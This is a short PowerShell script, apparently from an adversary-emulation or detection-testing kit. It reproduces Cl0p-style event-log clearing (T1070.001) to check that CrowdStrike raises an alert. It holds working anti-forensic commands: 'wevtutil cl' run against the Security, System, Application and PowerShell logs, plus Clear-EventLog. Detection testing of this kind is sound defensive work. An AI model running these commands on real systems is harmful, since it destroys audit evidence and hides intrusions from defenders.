<#
.SYNOPSIS
    Cl0p Event Log Clearing - DETECTION TRIGGER
.DESCRIPTION
    Clears Windows event logs.
    Will trigger EDR detection for T1070.001.
    REQUIRES ADMIN PRIVILEGES.
    TTP: T1070.001
#>
Write-Host "[*] Starting Cl0p Event Log Clearing (T1070.001)" -ForegroundColor Cyan
Write-Host "[*] This will trigger EDR detection for indicator removal" -ForegroundColor Yellow

try {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        Write-Host "[!] WARNING: Not running as Administrator" -ForegroundColor Red
    }
    
    # ACTUAL DETECTION TRIGGER - Clear event logs
    $logs = @("Security", "System", "Application", "Windows PowerShell")
    
    foreach ($log in $logs) {
        Write-Host "[*] Clearing log: $log"
        
        try {
            wevtutil cl $log 2>&1 | Out-Null
            Write-Host "[+] Cleared: $log" -ForegroundColor Green
        } catch {
            Write-Host "[-] Failed to clear $log" -ForegroundColor Yellow
        }
    }
    
    # Also try PowerShell method
    Write-Host "[*] Executing: Clear-EventLog"
    Clear-EventLog -LogName Security,System,Application -ErrorAction SilentlyContinue
    
    Write-Host "[+] SUCCESS: Event logs cleared" -ForegroundColor Green
    Write-Host "[!] CrowdStrike should detect: 'EventLogCleared' or 'IndicatorRemoval'" -ForegroundColor Magenta
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}

Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
